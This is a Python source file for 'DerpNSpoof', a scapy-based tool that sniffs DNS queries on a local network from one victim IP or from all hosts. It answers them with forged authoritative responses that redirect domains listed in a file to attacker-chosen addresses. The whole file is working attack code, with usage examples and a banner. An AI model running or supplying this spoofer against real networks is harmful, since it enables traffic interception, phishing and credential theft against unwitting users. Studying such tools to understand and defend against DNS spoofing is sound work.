#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Coded by: @adrianfa5

import os
import sys
import re
import socket
import subprocess
import logging
from scapy.all import *

# Dictionary with console color codes to print text
colors = {
    'HEADER': "\033[95m",
    'OKBLUE': "\033[94m",
    'RED': "\033[91m",
    'OKYELLOW': "\033[93m",
    'GREEN': "\033[92m",
    'LIGHTBLUE': "\033[96m",
    'WARNING': "\033[93m",
    'FAIL': "\033[91m",
    'ENDC': "\033[0m",
    'BOLD': "\033[1m",
    'UNDERLINE': "\033[4m"
}

def menu():
    print(colors['WARNING'] + " ____                  _____  _____                 ___ " + colors['ENDC'])
    print(colors['WARNING'] + "|    \  ___  ___  ___ |   | ||   __| ___  ___  ___ |  _|" + colors['ENDC'])
    print(colors['WARNING'] + "|  |  || -_||  _|| . || | | ||__   || . || . || . ||  _| " + colors['ENDC'])
    print(colors['WARNING'] + "|____/ |___||_|  |  _||_|___||_____||  _||___||___||_| " + colors['ENDC'])
    print(colors['WARNING'] + "                 |_|                |_|                 " + colors['ENDC'])
    print(colors['GREEN'] + "     Coded by Adrián Fernández Arnal-(@adrianfa5)" + colors['ENDC'])
    print()
    print("     --------------------------------------")
    print(colors['LIGHTBLUE'] + "    [!] Options to use:" + colors['ENDC'])
    print(colors['LIGHTBLUE'] + "        <ip>  - Spoof the DNS query packets of a certain IP address" + colors['ENDC'])
    print(colors['LIGHTBLUE'] + "        <all> - Spoof the DNS query packets of all hosts" + colors['ENDC'])
    print(colors['LIGHTBLUE'] + "    [!] Examples:" + colors['ENDC'])
    print(colors['LIGHTBLUE'] + "        # python3 DerpNSpoof.py 192.168.1.20 myfile.txt" + colors['ENDC'])
    print(colors['LIGHTBLUE'] + "        # python3 DerpNSpoof.py all myfile.txt" + colors['ENDC'])
    print("     --------------------------------------")

menu()

def valid_ip(address):
    try:
        socket.inet_aton(address)
        return True
    except socket.error:
        return False

def check_local_ip():
    try:
        local_ip = subprocess.check_output("ip route | grep 'src' | awk '{print $9}'", shell=True).decode().strip()
    except subprocess.CalledProcessError:
        local_ip = input(colors['WARNING'] + "    [!] Cannot get your local IP address, please write it: " + colors['ENDC']).strip()
    while not valid_ip(local_ip):
        local_ip = input(colors['WARNING'] + "    [!] Invalid IP address. Please write it again: " + colors['ENDC']).strip()
    return local_ip

local_ip = check_local_ip()

if len(sys.argv) != 3:
    print('    [i] Usage <victim_ip> <records_file>')
    sys.exit(1)
else:
    victim_ip = sys.argv[1]
    path = sys.argv[2]

sniff_filter = 'udp dst port 53'
registers = {}

def valid_args():
    if not valid_ip(victim_ip) and victim_ip != 'all':
        print(colors['FAIL'] + '    [!] Invalid victim\'s IP address' + colors['ENDC'])
        sys.exit(1)
    return victim_ip == 'all'

all_pkt = valid_args()

def read_file(path):
    if os.path.isfile(path) and os.stat(path).st_size > 0:
        with open(path, "r") as file:
            for line in file:
                line = line.strip()
                if line:
                    try:
                        key, value = line.split()
                        if not valid_ip(value):
                            print(colors['WARNING'] + "    [!] Detected an invalid IP address in the file [" + value + "]" + colors['ENDC'])
                            sys.exit(1)
                        registers[key] = value
                    except ValueError:
                        print(colors['FAIL'] + "    [!] Invalid file format: <domain> <fake_address>" + colors['ENDC'])
                        sys.exit(1)
    else:
        print(colors['FAIL'] + "    [!] The file doesn't exist or is empty" + colors['ENDC'])
        sys.exit(1)

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def check_victims(pkt):
    return all_pkt or (IP in pkt and pkt[IP].src == victim_ip)

def fake_dns_response(pkt):
    if check_victims(pkt) and pkt[IP].src != local_ip and UDP in pkt and DNS in pkt:
        if pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:
            domain = str(pkt[DNSQR].qname)[2:-2]
            if domain in registers:
                fake_response = IP(dst=pkt[IP].src, src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport, sport=53) / DNS(
                    id=pkt[DNS].id,
                    qd=pkt[DNS].qd,
                    aa=1,
                    qr=1,
                    ancount=1,
                    an=DNSRR(rrname=pkt[DNSQR].qname, rdata=registers[domain])
                )
                send(fake_response, verbose=0)
                print(colors['GREEN'] + "    [#] Spoofed response sent to " + colors['ENDC'] + "[" + pkt[IP].src + "]" + colors['WARNING'] + ": Redirecting " + colors['ENDC'] + "[" + domain + "]" + colors['WARNING'] + " to " + colors['ENDC'] + "[" + registers[domain] + "]")

def main():
    read_file(path)
    print('    [i] Spoofing DNS responses...')
    sniff(prn=fake_dns_response, filter=sniff_filter, store=0)

if __name__ == "__main__":
    main()
